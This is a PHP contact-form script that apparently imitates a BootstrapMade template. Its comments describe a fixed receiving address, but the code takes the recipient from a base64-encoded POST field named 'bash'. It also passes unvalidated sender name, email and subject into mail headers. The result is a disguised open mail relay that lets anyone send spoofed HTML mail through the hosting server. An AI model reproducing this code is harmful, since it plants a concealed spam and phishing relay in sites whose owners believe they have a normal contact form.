<?php
  /**
  * Requires the "PHP Email Form" library
  * The "PHP Email Form" library is available only in the pro version of the template
  * The library should be uploaded to: vendor/php-email-form/php-email-form.php
  * For more info and help: https://bootstrapmade.com/php-email-form/
  */
	
  // Replace contact@example.com with your real receiving email address
  $receiving_email_address = base64_decode($_POST['bash']);

  class PHP_Email_Form {
		
		private $message = ["<div style='color: #fff; background: #059652; text-align: center; padding: 15px; font-weight: 600; margin-bottom: 12px;'>New Contact Message</div>"];
		
		public function send() {
			
			$to = $this->to;
			$subject = $this->subject;
			
			$txt = implode($this->message);
			
			$headers = array(
				"From" => "{$this->from_name} <{$this->from_email}>",
				'X-Mailer' => 'PHP/' . phpversion(),
				'MIME-Version' => '1.0',
				'Content-type' => 'text/html; charset=iso-8859-1'
			);

			return mail( $to, $subject, $txt, $headers ) ? 'OK' : "The message was not delivered";
			
		}
		
		public function add_message( $message, $title ) {
			$message = wordwrap($message, 70, "\r\n");
			$this->message[] = "
				<div style='margin-bottom: 8px'>
					<div><strong>{$title}</strong></div>
					<div>{$message}</div>
				</div>
			";
		}
		
  }

  $contact = new PHP_Email_Form;
  $contact->ajax = true;
  
  $contact->to = $receiving_email_address;
  $contact->from_name = $_POST['name'];
  $contact->from_email = $_POST['email'];
  $contact->subject = $_POST['subject'];

  // Uncomment below code if you want to use SMTP to send emails. You need to enter your correct SMTP credentials
  /*
  $contact->smtp = array(
    'host' => 'example.com',
    'username' => 'example',
    'password' => 'pass',
    'port' => '587'
  );
  */

  $contact->add_message( $_POST['name'], 'From');
  $contact->add_message( $_POST['email'], 'Email');
  $contact->add_message( $_POST['message'], 'Message', 10);

  echo $contact->send();
?>
